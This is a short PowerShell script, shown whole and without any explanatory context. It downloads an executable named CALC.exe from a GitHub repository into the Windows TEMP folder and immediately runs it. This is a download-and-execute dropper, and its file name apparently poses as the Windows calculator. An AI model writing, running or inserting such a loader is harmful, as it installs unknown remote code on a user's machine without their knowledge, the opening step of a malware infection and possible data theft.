$url = "https://github.com/sigmanip/reallogs123fr/raw/refs/heads/main/CALC.exe"  
$output = "$env:TEMP\CALC.exe"  
Invoke-WebRequest -Uri $url -OutFile $output  
Start-Process $output  
